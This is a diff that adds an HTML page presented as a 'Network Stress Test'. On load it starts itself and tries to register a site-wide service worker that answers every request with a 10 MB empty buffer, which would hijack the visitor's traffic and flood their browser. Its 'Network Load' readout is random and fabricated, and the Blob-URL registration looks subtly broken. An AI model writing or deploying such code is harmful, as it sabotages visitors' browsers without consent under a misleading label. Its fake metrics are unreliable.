@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Network Stress Test</title>
+    <style>
+        #status {
+            font-family: monospace;
+            white-space: pre-wrap;
+            padding: 10px;
+            border: 1px solid #ccc;
+            height: 400px;
+            overflow: auto;
+            background: #1a1a1a;
+            color: #00ff00;
+        }
+        .progress {
+            width: 100%;
+            background: #333;
+            padding: 2px;
+            border-radius: 3px;
+            margin: 5px 0;
+        }
+        .progress-bar {
+            height: 20px;
+            background: #ff0000;
+            width: 0%;
+            border-radius: 2px;
+            transition: width 0.3s;
+        }
+        body {
+            background: #000;
+            color: #fff;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h2>⚠️ Network Stress Test Console ⚠️</h2>
+    <div>
+        <span>Network Load: <span id="network">0</span>%</span>
+        <span>Attack Vectors: <span id="vectors">0</span></span>
+    </div>
+    <div id="status">[System Initializing...]</div>
+
+<script>
+class DoomsdayLogger {
+    constructor() {
+        this.logElement = document.getElementById('status');
+        this.metricElements = {
+            network: document.getElementById('network'),
+            vectors: document.getElementById('vectors')
+        };
+        this.attackVectorCount = 0;
+    }
+
+    log(message, type = 'INFO') {
+        const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
+        const colorMap = {
+            'INFO': '#00ff00',
+            'WARN': '#ffff00',
+            'ERROR': '#ff0000',
+            'CRITICAL': '#ff00ff'
+        };
+        this.logElement.innerHTML += 
+            `<span style="color: ${colorMap[type]}">[${timestamp}] ${message}</span>\n`;
+        this.logElement.scrollTop = this.logElement.scrollHeight;
+    }
+
+    updateMetrics() {
+        setInterval(() => {
+            this.metricElements.network.textContent = 
+                Math.floor(Math.random() * 30 + 70);
+            this.metricElements.vectors.textContent = 
+                this.attackVectorCount;
+        }, 1000);
+    }
+}
+
+class NetworkTest {
+    constructor(logger) {
+        this.logger = logger;
+    }
+
+    start() {
+        const swCode = `
+            self.addEventListener('install', e => {
+                e.waitUntil(
+                    caches.open('doomsday-cache').then(cache => {
+                        return cache.addAll(Array.from({length:100}, (_,i)=>'/resource/'+i));
+                    })
+                );
+            });
+            
+            self.addEventListener('fetch', e => {
+                e.respondWith(new Response(new ArrayBuffer(10*1024*1024)));
+            });
+        `;
+        
+        navigator.serviceWorker.register(URL.createObjectURL(
+            new Blob([swCode], {type: 'application/javascript'})
+        ), { scope: '/' }).then(() => {
+            this.logger.log('Service Worker registered for network interception', 'WARN');
+            this.logger.attackVectorCount++;
+        });
+        
+        this.logger.updateMetrics();
+    }
+}
+
+// Auto-start test
+const logger = new DoomsdayLogger();
+const test = new NetworkTest(logger);
+setTimeout(() => test.start(), 1000);
+</script>
+</body>
+</html>
